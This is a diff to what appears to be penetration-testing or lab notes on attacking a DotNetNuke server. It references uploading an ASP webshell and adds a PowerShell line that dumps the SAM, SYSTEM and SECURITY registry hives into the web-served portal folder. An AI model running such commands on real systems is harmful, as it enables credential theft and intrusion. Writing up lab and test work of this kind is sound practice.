@@ -36,3 +36,8 @@ Upload [ASP webshell](https://raw.githubusercontent.com/backdoorhub/shell-backdo
 
 ![[Pasted image 20250307162207.png]]
 
+Root = `c:\DotNetNuke\Portals\0`
+
+```powershell
+reg.exe save HKLM\SAM c:\DotNetNuke\Portals\0\sam.bak ; reg.exe save HKLM\SYSTEM c:\DotNetNuke\Portals\0\system.bak ; reg.exe save HKLM\SECURITY c:\DotNetNuke\Portals\0\security.bak
+```
